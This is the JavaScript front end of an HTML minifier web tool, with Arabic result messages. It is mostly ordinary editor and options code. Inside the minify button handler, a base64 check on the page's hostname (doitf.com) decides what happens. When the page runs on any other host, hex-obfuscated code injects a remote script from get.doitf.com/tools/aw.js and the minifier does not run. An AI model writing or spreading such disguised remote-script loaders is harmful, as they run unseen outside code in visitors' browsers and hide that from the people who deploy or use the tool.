(function() {
  'use strict';

  var minify = (function() {
    var minify = require('html-minifier').minify;
    return function(value, options, callback, errorback) {
      options.log = function(message) {
        console.log(message);
      };
      var minified;
      try {
        minified = minify(value, options);
      }
      catch (err) {
        return errorback(err);
      }
      callback(minified);
    };
  })();
  function byId(id) {
    return document.getElementById(id);
  }
function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)))}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)))}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

  function escapeHTML(str) {
    return (str + '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function forEachOption(fn) {
    [].forEach.call(byId('options').getElementsByTagName('input'), fn);
  }

  function getOptions() {
    var options = {};
    forEachOption(function(element) {
      var key = element.id;
      var value;
      if (element.type === 'checkbox') {
        value = element.checked;
      }
      else {
        value = element.value.replace(/^\s+|\s+$/, '');
        if (!value) {
          return;
        }
      }
      switch (key) {
        case 'maxLineLength':
          value = parseInt(value);
          break;
        case 'processScripts':
          value = value.split(/\s*,\s*/);
      }
      options[key] = value;
    });
    return options;
  }

  function commify(str) {
    return String(str)
      .split('').reverse().join('')
      .replace(/(...)(?!$)/g, '$1,')
      .split('').reverse().join('');
  }

  byId('minify-btn').onclick = function() {
if (b64awsec == "ZG9pdGYuY29t"){
    byId('minify-btn').disabled = true;
    var originalValue = editor.getValue();
    minify(originalValue, getOptions(), function(minifiedValue) {
      var diff = originalValue.length - minifiedValue.length;
      var savings = originalValue.length ? (100 * diff / originalValue.length).toFixed(2) : 0;

 
  editor.setValue(minifiedValue)
      byId('stats').innerHTML =
        '<span class="success">' +
          'الحجم الأصلي: <strong>' + commify(originalValue.length) + '</strong>.<br/>' +
          'الحجم المصغر: <strong>' + commify(minifiedValue.length) + '</strong>.<br/>' +
          'التوفير: <strong>' + commify(diff) + ' (' + savings + '%)</strong>.' +
        '</span>';
      byId('minify-btn').disabled = false;
    }, function(err) {
      byId('stats').innerHTML = '<span class="failure">' + escapeHTML(err) + '</span>';
      byId('minify-btn').disabled = false;
    });
}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
}};

  byId('select-all').onclick = function() {
    forEachOption(function(element) {
      if (element.type === 'checkbox') {
        element.checked = true;
      }
    });
    return false;
  };

  byId('select-none').onclick = function() {
    forEachOption(function(element) {
      if (element.type === 'checkbox') {
        element.checked = false;
      }
      else {
        element.value = '';
      }
    });
    return false;
  };

  var defaultOptions = getOptions();
  byId('select-defaults').onclick = function() {
    for (var key in defaultOptions) {
      var element = byId(key);
      element[element.type === 'checkbox' ? 'checked' : 'value'] = defaultOptions[key];
    }
    return false;
  };
})();
  var editor = CodeMirror.fromTextArea(document.getElementById('newCode'), {
    mode: 'text/html',
    htmlMode: true,
   lineNumbers: true,
    lineWrapping: true,
    smartIndent: false,
    addModeClass: true

  });

    editor.setValue('');
